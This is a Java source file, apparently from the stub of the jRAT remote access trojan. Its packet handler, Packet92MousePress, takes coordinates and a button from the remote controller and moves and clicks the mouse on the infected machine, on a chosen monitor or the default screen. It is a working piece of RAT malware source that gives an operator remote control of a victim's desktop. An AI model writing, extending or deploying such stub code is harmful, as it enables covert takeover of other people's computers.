package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet92MousePress extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = con.readInt();
		int y = con.readInt();
		int btn = con.readInt();
		int monitor = con.readInt();
		
		if (monitor == -1) {
			ScreenUtils.getDefault().mouseMove(x, y);
			ScreenUtils.getDefault().mousePress(btn);
		} else {
			ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
			ScreenUtils.getAllRobots()[monitor].mousePress(btn);
		}
	}

}
